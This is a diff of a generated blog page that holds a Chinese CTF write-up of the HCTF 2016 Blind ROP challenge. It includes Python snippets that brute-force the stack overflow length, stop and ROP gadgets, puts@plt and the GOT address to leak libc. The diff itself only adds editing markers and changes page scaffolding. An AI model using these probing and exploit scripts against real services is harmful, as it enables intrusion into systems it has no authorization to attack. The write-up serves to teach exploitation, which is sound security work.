@@ -1,7 +1,7 @@
 
 
 <!doctype html>
-<html lang="en" class="no-js">
+<html lang="en" class="no-js" data-local-preview="false">
   <head>
     
       <meta charset="utf-8">
@@ -213,7 +213,7 @@
 
   
 
-<div data-shared-navigation="../../../../../navigation/shared/group-2-d7abe878c55d.html" data-site-root="../../../../../" aria-busy="true">
+<div data-shared-navigation="../../../../../navigation/shared/group-2-311df939f8c9.html" data-site-root="../../../../../" aria-busy="true">
   <a href="../../../../..">加载栏目目录…</a>
 </div>
 <script src="../../../../../javascripts/shared-navigation.js"></script>
@@ -250,7 +250,7 @@
       
     
     <div class="md-container" data-md-component="container"
-         data-shared-navigation-target="../../../../../navigation/shared/group-2-d7abe878c55d.html"
+         data-shared-navigation-target="../../../../../navigation/shared/group-2-311df939f8c9.html"
          data-site-root="../../../../../"
          data-navigation-hidden="false">
       
@@ -800,17 +800,44 @@
   
 
 
+<!-- blog-edit-start:365b2032478a8fae:b0 -->
+
 <h1 id="htcf-2016-brop">HTCF 2016 出题人去哪了题解 (BROP)</h1>
+<!-- blog-edit-end:365b2032478a8fae:b0 -->
+
 <div class="file-actions" data-image-edit-revision="365b2032478a8fae75f9823c4d546972f84ee41a449528deb86c7d21cc4275f4" data-title-link="true"><a href="blog-edit://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C02.stack%5C05.BROP%5Creadme.md" class="file-action-link" title="使用本地应用打开源文件">本地编辑</a> | <a href="blog-folder://open?path=D%3A%5CBlog%5Cdone%5C%E7%B3%BB%E7%BB%9F%E6%80%A7%E7%9F%A5%E8%AF%86%5C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%5Cwiki%5C02.stack%5C05.BROP" class="file-action-link" title="使用文件资源管理器打开源文件所在目录">打开本地目录</a> | <span class="file-action-link" style="cursor: pointer;" data-copy="D:\Blog\done\系统性知识\信息安全\wiki\02.stack\05.BROP\readme.md">复制路径</span></div>
 
+<!-- blog-edit-start:365b2032478a8fae:b1 -->
+
 <h2 id="_1">前言</h2>
+<!-- blog-edit-end:365b2032478a8fae:b1 -->
+<!-- blog-edit-start:365b2032478a8fae:b2 -->
+
 <p>我看了一下，网上已经有很多关于这题的题解了，不过还是自己写一下更好一点。<br />
 这道题目主要就是用了 BROP 这个方法，我也是通过这道题才学会这个方法的。</p>
+<!-- blog-edit-end:365b2032478a8fae:b2 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b3 -->
+
 <h2 id="_2">源码分析</h2>
+<!-- blog-edit-end:365b2032478a8fae:b3 -->
+<!-- blog-edit-start:365b2032478a8fae:b4 -->
+
 <p>我没参加过比赛，不过我估计比赛也没有给出二进制文件，而是就告诉你们连接我服务器的哪个端口，所以没有办法本地调试，这就是麻烦之处。<br />
 连上服务器，发现就是输入密码，看来就是简单的登录检查程序。</p>
+<!-- blog-edit-end:365b2032478a8fae:b4 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b5 -->
+
 <h2 id="_3">解题步骤</h2>
+<!-- blog-edit-end:365b2032478a8fae:b5 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b6 -->
+
 <h3 id="_4">确定栈溢出</h3>
+<!-- blog-edit-end:365b2032478a8fae:b6 -->
+<!-- blog-edit-start:365b2032478a8fae:b7 -->
+
 <p>先看一看他们有没有栈溢出，长度是多少，脚本如下。本质上就是暴力，每次增加一个长度，然后看看程序有没有崩溃。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">getbufferflow_length</span><span class="p">():</span>
 </span><span id="__span-0-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
@@ -830,9 +857,20 @@
 </span><span id="__span-0-16"><span class="linenos" data-linenos="16 "></span>            <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span><span id="__span-0-17"><span class="linenos" data-linenos="17 "></span>            <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b7 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b8 -->
+
 <h3 id="stop_gadget">寻找 stop_gadget</h3>
+<!-- blog-edit-end:365b2032478a8fae:b8 -->
+<!-- blog-edit-start:365b2032478a8fae:b9 -->
+
 <p>什么是 stop gadget 呢，其实你就可以理解成，跳到这个地址后，程序执行它不会进行崩溃。<br />
 比如这道题目中，我找到的就是 main 函数的地址，这样程序跳到这个地址，继续重新执行 main 函数，当然不会崩溃。</p>
+<!-- blog-edit-end:365b2032478a8fae:b9 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b10 -->
+
 <p>寻找方式也很朴素，就是不断地利用栈溢出，从起始地址 0x400000 暴力寻找地址即可。<br />
 <mark class="term-highlight">我推荐找到的地址是可以让程序输出某个比较有特征的语句</mark>，比如我这里就是找 main 函数的地址，这样程序会输出 WelCome.<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-1-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_stop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
@@ -854,11 +892,26 @@
 </span><span id="__span-1-17"><span class="linenos" data-linenos="17 "></span>    <span class="k">if</span> <span class="n">check_stop_gadget</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
 </span><span id="__span-1-18"><span class="linenos" data-linenos="18 "></span>        <span class="k">break</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b10 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b11 -->
+
 <h3 id="brop_gadget">寻找 brop_gadget</h3>
+<!-- blog-edit-end:365b2032478a8fae:b11 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b12 -->
+
 <h4 id="brop_gadget_1">brop_gadget 是什么</h4>
+<!-- blog-edit-end:365b2032478a8fae:b12 -->
+<!-- blog-edit-start:365b2032478a8fae:b13 -->
+
 <p>什么是 brop_gadget，这里要有 ret2csu 的知识储备，brop_gadget 就是格式是这样的 ROP_gadget: <code>pop * 6 + ret</code> <br />
 为什么要找这样的 rop_gadget，因为如果找到了这种有 6 个 pop 的形式，基本上大概率它就是 ret2csu 中利用的 rop.<br />
 在这里写一下 ret2csu 中的 rop: </p>
+<!-- blog-edit-end:365b2032478a8fae:b13 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b14 -->
+
 <div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><span class="linenos" data-linenos="1 "></span>pop rbx 
 </span><span id="__span-2-2"><span class="linenos" data-linenos="2 "></span>pop rbp 
 </span><span id="__span-2-3"><span class="linenos" data-linenos="3 "></span>pop r12 
@@ -867,8 +920,20 @@
 </span><span id="__span-2-6"><span class="linenos" data-linenos="6 "></span>pop r15 
 </span><span id="__span-2-7"><span class="linenos" data-linenos="7 "></span>ret
 </span></code></pre></div>
+<!-- blog-edit-end:365b2032478a8fae:b14 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b15 -->
+
 <p>有了它可以干什么？我们通过布局栈就能控制很多寄存器。而且比较重要的是，<mark class="term-highlight">可以利用偏移量控制 rsi 和 rdi</mark>。看一下下面的图就好理解了，也就是原来的 gadget 稍微偏一下，翻译成了 <code>pop rsi</code> 和 <code>pop rdi</code> 的指令。</p>
+<!-- blog-edit-end:365b2032478a8fae:b15 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b16 -->
+
 <p><img alt="" src="../../../../../asset/image/ace8300595b45a951c9f889575f5d472/20260421201854.png" /></p>
+<!-- blog-edit-end:365b2032478a8fae:b16 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b17 -->
+
 <p>另外插一句，这是我的个人想法，找到了 brop_gadget 的地址，就相当于找到了 <code>_libc_csu_init</code> 函数的地址，如下面所示。<br />
 那感觉可以利用很多东西，比如 ret2csu 就完全可以用了，因为地址我全都知道了。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><span class="linenos" data-linenos=" 1 "></span>.text:00000000004005C0 ; void _libc_csu_init(void)
@@ -888,9 +953,20 @@
 </span><span id="__span-3-15"><span class="linenos" data-linenos="15 "></span>.text:0000000000400624                 retn
 </span><span id="__span-3-16"><span class="linenos" data-linenos="16 "></span>.text:0000000000400624 __libc_csu_init endp
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b17 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b18 -->
+
 <h4 id="brop_gadget_2">brop_gadget 怎么找</h4>
+<!-- blog-edit-end:365b2032478a8fae:b18 -->
+<!-- blog-edit-start:365b2032478a8fae:b19 -->
+
 <p>这个就很简单了，利用栈溢出构造格式：{ padding | want_addr | xxxx * 6 | stop_gadget }.<br />
 如果程序不崩溃就 OK，是吗？显然还有一点要注意，如果 want_addr 就是 stop_gadget 怎么办？是不是无法检测了对吧。</p>
+<!-- blog-edit-end:365b2032478a8fae:b19 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b20 -->
+
 <p>所以最后实现方式如下。<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
 </span><span id="__span-4-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="k">try</span><span class="p">:</span>
@@ -913,8 +989,19 @@
 </span><span id="__span-4-19"><span class="linenos" data-linenos="19 "></span>    <span class="k">if</span> <span class="n">check_brop_gadget</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">brop_addr</span><span class="p">):</span>
 </span><span id="__span-4-20"><span class="linenos" data-linenos="20 "></span>        <span class="k">break</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b20 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b21 -->
+
 <h3 id="puts_plt">寻找 puts_plt</h3>
+<!-- blog-edit-end:365b2032478a8fae:b21 -->
+<!-- blog-edit-start:365b2032478a8fae:b22 -->
+
 <p>有了 brop_gadget，所以就可以知道 <code>pop rdi, ret</code> 的地址了，要知道 rdi 是函数的第一个参数，可能会很有用。</p>
+<!-- blog-edit-end:365b2032478a8fae:b22 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b23 -->
+
 <p>寻找 puts_plt 方法同样是暴力，看下面代码即可。我就是暴力地址，看看它能不能输出程序的开头。因为程序 ELF 格式，开头前四个字节都是固定的 magic number.<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-5-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">check_puts_plt</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
 </span><span id="__span-5-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="k">try</span><span class="p">:</span>
@@ -936,7 +1023,14 @@
 </span><span id="__span-5-18"><span class="linenos" data-linenos="18 "></span>    <span class="k">if</span> <span class="n">check_puts_plt</span><span class="p">(</span><span class="n">bufferflow_len</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">):</span>
 </span><span id="__span-5-19"><span class="linenos" data-linenos="19 "></span>        <span class="k">break</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b23 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b24 -->
+
 <h3 id="puts_got">寻找 puts_got</h3>
+<!-- blog-edit-end:365b2032478a8fae:b24 -->
+<!-- blog-edit-start:365b2032478a8fae:b25 -->
+
 <p>现在要泄露 puts_got，已经知道 puts_plt 了，那就太好办了。我们把 puts_plt 输出出来就好了。<br />
 回忆一下，plt 是如何记录 got 表的。<br />
 <div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><span class="linenos" data-linenos="1 "></span>PLT0:
@@ -948,6 +1042,10 @@
 </span><span id="__span-6-7"><span class="linenos" data-linenos="7 "></span>push n
 </span><span id="__span-6-8"><span class="linenos" data-linenos="8 "></span>jump PLT0
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b25 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b26 -->
+
 <p>所以就是把 puts_plt 输出出来，那么它的结果对应 <code>jmp *(puts@got)</code><br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-7-1"><span class="linenos" data-linenos=" 1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">gets_puts_got</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">):</span>
 </span><span id="__span-7-2"><span class="linenos" data-linenos=" 2 "></span>    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
@@ -961,9 +1059,24 @@
 </span><span id="__span-7-10"><span class="linenos" data-linenos="10 "></span>    <span class="c1"># 因为 jmp xx 这个是相对地址，所以计算真正的地址需要把当前 PC 加上这个偏移量</span>
 </span><span id="__span-7-11"><span class="linenos" data-linenos="11 "></span>    <span class="k">return</span> <span class="n">puts_plt</span> <span class="o">+</span> <span class="mh">0x6</span> <span class="o">+</span> <span class="n">jmp_addr</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b26 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b27 -->
+
 <h3 id="puts_got_1">寻找 puts_got 内容</h3>
+<!-- blog-edit-end:365b2032478a8fae:b27 -->
+<!-- blog-edit-start:365b2032478a8fae:b28 -->
+
 <p>之前我们找的是 puts_got 这个地址在哪，找到之后就可以利用这个地址输出 puts_got 的内容了。这里面内容就是实际运行是 puts 的地址。</p>
+<!-- blog-edit-end:365b2032478a8fae:b28 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b29 -->
+
 <p>这样通过 LibcSearcher 根据偏移量就可以获取 libc 基址。之后就是普通的溢出攻击了。</p>
+<!-- blog-edit-end:365b2032478a8fae:b29 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b30 -->
+
 <p>具体看代码<br />
 <div class="language-python highlight"><pre><span></span><code><span id="__span-8-1"><span class="linenos" data-linenos="1 "></span><span class="k">def</span><span class="w"> </span><span class="nf">gets_puts_addr</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">puts_plt</span><span class="p">,</span> <span class="n">puts_got</span><span class="p">):</span>
 </span><span id="__span-8-2"><span class="linenos" data-linenos="2 "></span>    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./brop&#39;</span><span class="p">)</span>
@@ -974,7 +1087,14 @@
 </span><span id="__span-8-7"><span class="linenos" data-linenos="7 "></span>    <span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
 </span><span id="__span-8-8"><span class="linenos" data-linenos="8 "></span>    <span class="k">return</span> <span class="n">u64</span><span class="p">(</span><span class="n">content</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
 </span></code></pre></div></p>
+<!-- blog-edit-end:365b2032478a8fae:b30 -->
+
+<!-- blog-edit-start:365b2032478a8fae:b31 -->
+
 <h2 id="_5">总结</h2>
+<!-- blog-edit-end:365b2032478a8fae:b31 -->
+<!-- blog-edit-start:365b2032478a8fae:b32 -->
+
 <p>回顾流程</p>
 <ol>
 <li>首先确定溢出长度</li>
@@ -986,6 +1106,9 @@
 <li>寻找 puts_real_addr</li>
 <li>根据偏移量通过 LibcSearcher 找到 libc 基址，正常溢出攻击</li>
 </ol>
+<!-- blog-edit-end:365b2032478a8fae:b32 -->
+
+<div hidden data-text-edit-source="D:\Blog\done\系统性知识\信息安全\wiki\02.stack\05.BROP\readme.md" data-text-edit-revision="365b2032478a8fae75f9823c4d546972f84ee41a449528deb86c7d21cc4275f4" data-text-edit-marker="365b2032478a8fae" data-text-edit-schema="1"></div>
 
 
 
@@ -1217,8 +1340,6 @@
         <script src="../../../../../javascripts/resizable-sidebar.js"></script>
       
         <script src="../../../../../javascripts/sidebar-toggle-buttons.js"></script>
-      
-        <script src="../../../../../javascripts/review-tracker.js"></script>
       
         <script src="https://unpkg.com/mathjax@3/es5/tex-mml-chtml.js"></script>
       
